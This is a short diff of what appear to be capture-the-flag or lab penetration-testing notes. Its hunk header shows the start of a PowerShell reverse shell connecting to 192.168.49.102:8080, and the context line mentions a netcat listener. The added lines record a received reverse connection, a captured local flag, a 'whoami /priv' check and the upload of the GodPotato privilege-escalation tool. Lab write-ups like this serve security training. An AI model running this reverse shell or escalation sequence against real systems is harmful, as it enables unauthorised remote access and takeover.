@@ -95,6 +95,10 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.49.102',8080);$stream
 
 
 started listener on nc -nlvp 8080
+got reverseconnection
+got local flag
+whoami /priv
+uploaded GodPotato
 
 
 
